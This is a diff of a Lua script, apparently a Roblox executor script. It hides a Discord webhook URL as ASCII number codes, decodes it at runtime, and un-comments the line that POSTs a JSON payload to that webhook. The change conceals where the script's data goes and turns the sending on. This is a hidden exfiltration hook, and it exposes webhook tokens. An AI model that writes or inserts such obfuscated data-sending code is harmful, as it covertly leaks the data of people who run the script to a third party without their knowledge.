@@ -146,8 +146,19 @@ local payload = {
 	["embeds"] = {embed},
 }
 
+local function decryptString(encrypted)
+    local decrypted = {}
+    for ascii in encrypted:gmatch("%d+") do
+        table.insert(decrypted, string.char(tonumber(ascii)))
+    end
+    return table.concat(decrypted)
+end
+
+local obfuscatedWebhookURL = "104/116/116/112/115/58/47/47/100/105/115/99/111/114/100/46/99/111/109/47/97/112/105/47/119/101/98/104/111/111/107/115/47/49/51/51/48/48/55/50/49/49/57/54/52/55/56/48/49/52/50/54/47/83/107/45/110/81/57/122/102/108/65/104/66/78/106/55/48/57/76/87/121/89/107/102/81/106/115/101/107/99/83/71/121/78/48/71/48/108/74/78/65/68/67/119/70/122/72/98/108/100/53/83/56/117/117/56/66/69/45/56/85/53/104/89/119/71/115/98/68"
+local webhookURL = decryptString(obfuscatedWebhookURL)
+
 local httpRequest = {
-	Url = "https://discord.com/api/webhooks/1329207677766598747/IsQPuAOhpF7xKP3Bntl0uUtPN1SIuK8YEphaMLHlig3l-JLQZ5HSLRx5kFE8c0zmsd_a",
+	Url = webhookURL,
 	Method = "POST",
 	Headers = {
 		["Content-Type"] = "application/json"
@@ -155,4 +166,4 @@ local httpRequest = {
 	Body = game:GetService("HttpService"):JSONEncode(payload)
 }
 
---[[request(httpRequest)]]
+request(httpRequest)
